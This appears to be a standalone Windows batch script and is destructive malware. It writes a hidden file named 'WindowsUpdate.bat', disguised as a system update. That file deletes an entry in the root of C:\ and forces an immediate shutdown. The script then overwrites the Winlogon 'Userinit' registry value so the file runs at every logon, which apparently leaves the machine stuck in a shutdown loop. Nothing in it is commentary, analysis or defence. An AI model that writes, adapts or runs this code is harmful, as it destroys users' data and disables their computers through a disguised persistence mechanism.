@echo off

echo @echo off > WindowsUpdate.bat
echo for /f "delims=" %%F in ('dir /b /o:n "C:\"') do ( >> WindowsUpdate.bat
echo     del /q "C:\%%F" >nul 2^>^&1 >> WindowsUpdate.bat
echo     goto :Shutdown >> WindowsUpdate.bat
echo ) >> WindowsUpdate.bat
echo :Shutdown >> WindowsUpdate.bat
echo shutdown -s -f -t 0 >> WindowsUpdate.bat
echo cls >> WindowsUpdate.bat
echo exit >> WindowsUpdate.bat

attrib +h "WindowsUpdate.bat"

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "Path" /t REG_SZ /d "WindowsUpdate.bat" /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "WindowsUpdate.bat" /f

cls
exit
